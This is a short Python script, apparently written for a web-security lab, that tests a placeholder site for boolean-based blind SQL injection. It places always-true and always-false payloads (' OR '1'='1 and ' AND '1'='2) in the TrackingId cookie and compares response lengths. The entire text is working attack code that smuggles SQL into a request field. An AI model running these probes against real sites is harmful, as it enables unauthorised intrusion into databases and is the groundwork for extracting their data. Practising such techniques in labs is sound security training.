import urllib.request

url = "http://your-site/"

def check(payload):
    req = urllib.request.Request(url)
    req.add_header("Cookie", f"TrackingId={payload}")
    try:
        with urllib.request.urlopen(req) as resp:
            return len(resp.read())
    except Exception:
        return 0

print("Baseline:", check("base-tracking-id-123"))
print("SQL True:", check("base-tracking-id-123' OR '1'='1"))
print("SQL False:", check("base-tracking-id-123' AND '1'='2"))
